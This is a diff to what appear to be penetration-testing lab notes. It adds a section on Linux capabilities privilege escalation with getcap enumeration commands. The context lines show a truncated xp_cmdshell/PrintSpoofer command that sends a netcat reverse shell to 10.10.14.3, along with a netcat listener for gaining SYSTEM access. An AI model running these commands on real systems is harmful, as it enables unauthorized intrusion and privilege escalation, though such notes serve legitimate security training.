@@ -309,3 +309,14 @@ SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -
 In kali >  nc -lvnp 1233
 
 Finally get nt/authority system
+_________________________________________________________________________________________________________________________________________________________________________________________
+Privilege escalation with capabilities
+--------------------------------------
+Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes,
+allowing them to perform specific actions that would otherwise be restricted. This allows for more fine-grained control over which processes have access to certain privileges, 
+making it more secure than the traditional Unix model of granting privileges to users and groups.
+
+#find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+#getcap /usr/bin/vim.basic
+
+
